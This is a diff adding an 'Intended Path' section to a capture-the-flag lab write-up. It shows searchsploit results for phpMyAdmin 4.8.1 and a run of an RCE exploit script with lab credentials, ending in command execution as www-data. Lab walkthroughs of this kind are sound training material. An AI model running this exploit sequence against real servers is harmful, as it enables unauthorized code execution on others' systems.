@@ -306,6 +306,29 @@ Running `curl 127.0.0.1` we see phpMyAdmin on port 80.
 
 ### Intended Path
 
+```bash
+┌──(user㉿kali-linux-2022-2)-[~]
+└─$ searchsploit   phpmyadmin 4.8.1                                                                           
+------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                |  Path
+------------------------------------------------------------------------------ ---------------------------------
+phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                   | php/webapps/44924.txt
+phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                   | php/webapps/44928.txt
+phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                                | php/webapps/50457.py
+------------------------------------------------------------------------------ ---------------------------------
+Shellcodes: No Results
+
+┌──(user㉿kali-linux-2022-2)-[~]
+└─$              
+```
+
+upload and run
+```bash
+ada@forgottenimplant:~$ python3 ./50457.py 127.0.0.1 80 / app s4Ucbrme id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+```
+
 ### Alternate Path
 
 In most challenges we’re trying to elevate OUT of the www-data account, lets look for an easier way in considering we already have a shell.
